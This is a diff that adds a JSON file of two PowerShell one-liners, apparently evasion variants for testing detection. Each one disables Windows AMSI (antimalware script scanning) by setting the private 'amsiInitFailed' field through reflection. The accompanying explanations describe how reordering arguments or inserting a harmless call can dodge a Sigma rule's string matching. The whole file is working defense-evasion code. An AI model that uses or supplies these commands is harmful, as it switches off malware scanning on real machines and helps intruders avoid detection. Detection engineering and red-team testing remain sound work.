@@ -1,0 +1,10 @@
+[
+  {
+    "output": "powershell -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', [System.Reflection.BindingFlags]::NonPublic, [System.Reflection.BindingFlags]::Static).SetValue($null, $true)\"",
+    "explanation": "Reordering: Reordered the command-line arguments to change the parsing sequence, potentially avoiding string-based detection."
+  },
+  {
+    "output": "powershell -Command \"[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation'); [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', [System.Reflection.BindingFlags]::NonPublic, [System.Reflection.BindingFlags]::Static).SetValue($null, $true)\"",
+    "explanation": "Insertion: Added a harmless LoadWithPartialName call to insert additional text, which may not trigger the Sigma rule's string matching."
+  }
+]
